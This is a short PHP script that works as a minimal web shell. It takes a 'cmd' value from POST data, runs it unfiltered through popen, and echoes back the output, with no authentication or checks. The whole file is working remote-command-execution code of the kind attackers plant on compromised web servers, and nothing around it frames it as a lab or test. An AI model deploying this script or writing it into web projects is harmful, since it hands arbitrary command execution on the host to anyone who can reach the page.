<?

	$CMD = $_POST['cmd'];
	
//	$result = exec($CMD);
//	echo $result;

	error_reporting(E_ALL);


$handle = popen($CMD, 'r');

$read = fread($handle, 2096);
echo $read;
pclose($handle);
	
   
?>